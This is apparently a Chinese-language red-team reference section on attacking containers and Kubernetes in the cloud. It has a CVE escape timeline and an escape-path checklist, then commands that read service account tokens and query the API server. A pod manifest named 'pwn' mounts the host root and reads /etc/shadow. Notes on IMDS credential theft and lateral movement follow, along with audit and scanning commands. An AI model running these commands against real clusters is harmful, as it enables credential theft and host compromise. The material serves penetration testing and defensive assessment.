## 六、容器与 Kubernetes 云环境攻击

> 深度联动技能：**[container-security-testing]**——本技能聚焦"云环境中的容器/K8s"，细粒度容器逃逸链请联动该技能

### 6.1 容器逃逸路径（2024-2025漏洞时间线）

| 漏洞 | 年份 | 组件 | 评分 | 要点 |
|------|------|------|------|------|
| CVE-2024-21626 Leaky Vessels | 2024.01 | runc | 8.6 | 文件描述符泄漏，80%云环境受影响；`/proc/self/fd/7` 逃逸 |
| CVE-2024-23651/23652/23653 | 2024.01 | BuildKit | 高 | 构建时竞态逃逸 |
| CVE-2024-1086 | 2024.01 | Linux内核 | 7.8 | netfilter use-after-free 提权 |
| CVE-2024-0132 | 2024.09 | NVIDIA Toolkit | 9.0 | TOCTOU逃逸 |
| CVE-2025-23266 NVIDIAScape | 2025.07 | NVIDIA Toolkit | 9.0 | OCI Hook + LD_PRELOAD注入，三行exploit，37%云环境受影响 |
| CVE-2025-9074 | 2025.08 | Docker Desktop | 9.3 | API未授权访问 |
| CVE-2025-31133/52565/52881 | 2025.11 | runc | 高 | 竞态条件/符号链接竞态逃逸，影响所有runc版本 |

**经典逃逸路径清单：**
```
1. 特权容器 → 直接访问宿主机设备/挂载
2. 内核漏洞 → 内核级逃逸
3. 挂载宿主机文件系统（hostPath /var 等）→ 读写宿主机
4. Docker Socket 挂载 → 创建特权容器
5. CAP_SYS_ADMIN → mount 逃逸
6. PID namespace 共享 → nsenter 逃逸
7. /proc/self/fd 泄漏（CVE-2024-21626）
8. GPU容器工具链（NVIDIA Container Toolkit）→ 新逃逸战场（AI工作负载）
9. 恶意镜像/恶意Dockerfile（workdir、LD_PRELOAD、挂载选项）→ 构建期逃逸
10. Docker Desktop API 未授权（CVE-2025-9074）→ 本地服务接管
```

### 6.2 Kubernetes 攻击

```bash
# Service Account Token 窃取（进入Pod后第一步）
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# API Server 未授权/弱认证访问
curl -k https://k8s-api:6443/api/v1/pods -H "Authorization: Bearer TOKEN"

# RBAC 审计（有没有权限做大动作）
kubectl auth can-i --list
kubectl get clusterrolebinding -o json
kubectl get secrets --all-namespaces

# 利用SA权限创建恶意工作负载（挂载宿主机根目录）
kubectl create -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  hostPID: true
  volumes:
  - name: host
    hostPath: {path: /, type: Directory}
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","chroot /host sh -c 'cat /etc/shadow' > /tmp/out; sleep 3600"]
    volumeMounts: [{name: host, mountPath: /host}]
EOF

# 创建高权限ClusterRole（若有RBAC写权限）
# 窃取 kubeconfig / kubectl 配置
# K8s横向移动：NetworkPolicy缺陷、Pod间网络嗅探、利用kube-proxy端口
```

### 6.3 云托管K8s的攻击特殊性

```
1. EKS workload 修改（AWS Threat Technique Catalog 2026新增）：改镜像/sidecar注入/pod规格，不新建资源，继承合法工作负载的网络访问、SA权限、数据访问——无准入控制器时难以发现
2. EKS 控制平面与节点角色的混合：节点IAM角色（NodeInstanceRole）权限过大 → 通过Pod内IMDS窃取节点角色凭据 → 直接调AWS API
3. AKS：Azure AD 集成RBAC的令牌滥用；GKE：Workload Identity 配置过宽
4. ACK（阿里云）：RBAC 弱配置授予 cluster-admin 是常态
5. 公开暴露的K8s API Server（6443）→ 未授权访问/弱凭据爆破
6. 托管K8s 的 Service Account 默认挂载：应用Pod默认挂载SA token，过度授权的SA是主要横向路径
```

### 6.4 云上容器安全检查命令

```bash
# 检查Pod/Namespace/RBAC风险（评估视角）
kubectl get pods -A -o wide
kubectl get psp,networkpolicy -A
kubectl get secrets,serviceaccounts -A
kubectl describe node | grep -A5 "Taints"

# 镜像漏洞扫描
trivy image <registry>/<image>:<tag>
trivy k8s --report summary cluster

# 运行时逃逸探测
kdigger bucket
# 环境探测：是否特权、capabilities、挂载、seccomp状态
```

